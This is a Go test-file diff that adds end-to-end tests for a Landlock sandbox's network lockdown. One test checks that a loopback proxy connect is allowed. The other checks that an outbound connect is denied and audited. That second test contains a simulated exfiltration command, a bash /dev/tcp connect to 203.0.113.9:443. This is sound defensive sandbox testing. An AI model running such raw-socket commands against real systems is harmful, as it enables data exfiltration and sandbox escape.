@@ -9,6 +9,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strconv"
 	"testing"
 	"time"
 
@@ -380,6 +381,121 @@ func TestLandlockHelper_DenyEmitsAuditViolation(t *testing.T) {
 	assert.Equal(t, "read access denied: "+secretPath, v.RuleLabel)
 	assert.Equal(t, "cat", v.Process)
 	assert.NotContains(t, v.RawLog, `"ts":0`)
+}
+
+// TestLandlockHelper_NetworkLockdownAllowsProxyPort is the positive control
+// for network_via_proxy_only: a loopback connect to the configured proxy
+// port must succeed while lockdown enforcement is active.
+func TestLandlockHelper_NetworkLockdownAllowsProxyPort(t *testing.T) {
+	if !landlockE2EEnabled() {
+		t.Skip("PMG_LANDLOCK_E2E not set; skipping landlock e2e (requires AppArmor disabled / unprivileged-userns sysctl)")
+	}
+	if _, err := landlockDetectABI(); err != nil {
+		t.Skipf("Landlock not available: %v", err)
+	}
+	if _, err := os.Stat("/bin/bash"); err != nil {
+		t.Skip("/bin/bash not found")
+	}
+
+	listener, err := net.Listen("tcp", "127.0.0.1:0")
+	require.NoError(t, err)
+	defer func() {
+		require.NoError(t, listener.Close())
+	}()
+	proxyPort := uint16(listener.Addr().(*net.TCPAddr).Port)
+
+	accepted := make(chan struct{}, 1)
+	go func() {
+		conn, err := listener.Accept()
+		if err == nil {
+			accepted <- struct{}{}
+			_ = conn.Close()
+		}
+	}()
+
+	policy := &landlockExecPolicy{
+		FilesystemRules:  baseRules(),
+		Network:          landlockNetworkPolicy{Lockdown: true, ProxyPort: proxyPort},
+		SkipPIDNamespace: true,
+		SkipIPCNamespace: true,
+		Command:          "/bin/bash",
+		Args:             []string{"-c", "exec 3<>/dev/tcp/127.0.0.1/" + strconv.Itoa(int(proxyPort))},
+	}
+	policyPath := writePolicyFile(t, policy)
+
+	stdout, stderr, exit := runHelper(t, policyPath)
+	assert.Equal(t, 0, exit, "loopback proxy connect must succeed; stdout=%q stderr=%q", stdout, stderr)
+
+	select {
+	case <-accepted:
+	case <-time.After(5 * time.Second):
+		t.Error("listener never saw the sandboxed connect")
+	}
+}
+
+// TestLandlockHelper_NetworkLockdownDeniesNonLoopback is the security-critical
+// assertion: under lockdown a connect to a non-loopback address must be
+// denied by the supervisor before any packet leaves — the address is in
+// TEST-NET-3, so a failure of the sandbox (not of routing) is the only way
+// to fail; and the audit pipeline must surface the denial as a typed
+// network_connect violation.
+func TestLandlockHelper_NetworkLockdownDeniesNonLoopback(t *testing.T) {
+	if !landlockE2EEnabled() {
+		t.Skip("PMG_LANDLOCK_E2E not set; skipping landlock e2e (requires AppArmor disabled / unprivileged-userns sysctl)")
+	}
+	if _, err := landlockDetectABI(); err != nil {
+		t.Skipf("Landlock not available: %v", err)
+	}
+	if _, err := os.Stat("/bin/bash"); err != nil {
+		t.Skip("/bin/bash not found")
+	}
+
+	policy := &landlockExecPolicy{
+		FilesystemRules:  baseRules(),
+		Network:          landlockNetworkPolicy{Lockdown: true, ProxyPort: 54321},
+		SkipPIDNamespace: true,
+		SkipIPCNamespace: true,
+		Command:          "/bin/bash",
+		Args:             []string{"-c", "echo exfil >&2; exec 3<>/dev/tcp/203.0.113.9/443"},
+	}
+	policyPath := writePolicyFile(t, policy)
+
+	socketPath := filepath.Join(t.TempDir(), "audit.sock")
+	listener, err := net.Listen("unix", socketPath)
+	require.NoError(t, err)
+	defer func() {
+		require.NoError(t, listener.Close())
+	}()
+
+	s := &landlockSandbox{}
+	done := make(chan struct{})
+	go func() {
+		defer close(done)
+		conn, err := listener.Accept()
+		if err != nil {
+			return
+		}
+		s.captureAuditEvents(conn)
+		_ = conn.Close()
+	}()
+
+	stdout, stderr, exit := runHelperWithAuditSocket(t, policyPath, socketPath)
+	assert.NotEqual(t, 0, exit, "non-loopback connect must fail under lockdown; stdout=%q", stdout)
+	assert.Contains(t, stdout+stderr, "exfil")
+
+	select {
+	case <-done:
+	case <-time.After(5 * time.Second):
+		t.Fatal("audit reader did not finish after helper exit")
+	}
+
+	violations := extractLandlockViolations(s.auditEvents)
+	require.Len(t, violations, 1, "expected exactly one network violation; events=%v", s.auditEvents)
+	v := violations[0]
+	assert.Equal(t, sandbox.ViolationKindNetworkConnect, v.Kind)
+	assert.Equal(t, "203.0.113.9:443", v.Target)
+	assert.Equal(t, "bash", v.Process)
+	assert.Contains(t, v.RuleLabel, "network_via_proxy_only")
 }
 
 // bytesContainsAny reports whether s contains any of the given substrings.
